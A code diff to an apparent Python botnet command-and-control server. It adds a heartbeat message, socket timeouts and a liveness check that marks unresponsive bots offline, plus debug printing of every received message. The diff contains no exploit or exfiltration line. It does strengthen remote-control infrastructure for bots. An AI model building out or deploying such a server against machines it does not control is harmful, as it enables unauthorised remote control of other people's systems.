@@ -11,10 +11,12 @@ import os
 import time
 import uuid
 import urllib.request
+import socket
 
 
 class BotNet(Thread):
     INPUT_TIMEOUT = 1
+    BOTCHECK_TIMEOUT = 10
     PRINTOUT_JSON = 'printout'
     ERROUT_JSON = 'errout'
     STDOUT_JSON = 'stdout'
@@ -164,12 +166,18 @@ class BotNet(Thread):
         '''
         Parse information coming from bots, loops
         '''
+        last_botcheck = time.time()
+        seen_dict = {}
+        sent_heartbeat = False
         while True:
             with self.connlock:
                 bots = list(self.onlineConnections.values())
                 while len(bots) == 0:
                     self.conncon.wait()
                     bots = list(self.onlineConnections.values())
+                for bot in bots:
+                    if bot not in seen_dict:
+                        seen_dict[bot] = False
             with self.app.app_context():
                 # Waiting for bot input, rescan for new bots every INPUT_TIMEOUT
                 # TODO maybe use pipe as interrupt instead of timeout?
@@ -180,6 +188,7 @@ class BotNet(Thread):
                     try:
                         msg = bot.recv()
                         jsonobj = json.loads(msg.decode('UTF-8'))
+                        print(jsonobj)
                         printout = ""
                         errout = ""
                         out = ""
@@ -248,10 +257,29 @@ class BotNet(Thread):
                         for filename in fileclose:
                             self.filemanager.closeFile(user, filename)
 
+                        seen_dict[bot] = True
+
                     except IOError as e:
                         # Connection was interrupted, set to offline
                         print(e)
                         self.setOffline(user)
+                    except Exception as e:
+                        print(e)
+
+                # Send heartbeats to all bots. If not response within a few loops then offline them.
+                if self.BOTCHECK_TIMEOUT/2 < (time.time() - last_botcheck) and not sent_heartbeat:
+                    for bot in bots:
+                        bot.heartbeat()
+                    sent_heartbeat = True
+
+                if self.BOTCHECK_TIMEOUT < (time.time() - last_botcheck):
+                    # Check all bots for connectivity
+                    for bot in bots:
+                        if not seen_dict[bot]:
+                            self.setOffline(bot.user)
+                    last_botcheck = time.time()
+                    seen_dict = {b: False for b in bots if b.online}
+                    sent_heartbeat = False
 
     def getLog(self, user):
         '''
@@ -459,6 +487,8 @@ class Bot:
     FILE_DOWNLOAD = 'down'
     LS_JSON = 'ls'
     ASSIGN_ID = 'assign'
+    HEARTBEAT = 'heartbeat'
+    HEARTBEAT_TIMEOUT = 3
 
     def __init__(self, sock, host_info, socketio, lastonline=int(time.time()), online=True):
         self.sock = formatsock.FormatSocket(sock)
@@ -664,6 +694,22 @@ class Bot:
                 self.sock.send(json_str)
             else:
                 self.opqueue.append((self.requestLs, (filename,)))
+
+    def heartbeat(self):
+        with self.datalock:
+            if self.online:
+                json_str = json.dumps({Bot.HEARTBEAT: True})
+                old_timeout = self.sock.gettimeout()
+                self.sock.settimeout(Bot.HEARTBEAT_TIMEOUT)
+                try:
+                    self.sock.send(json_str)
+                    return True
+                except socket.timeout as e:
+                    return False
+                finally:
+                    self.sock.settimeout(old_timeout)
+            else:
+                return False
 
 
 class BotLog:
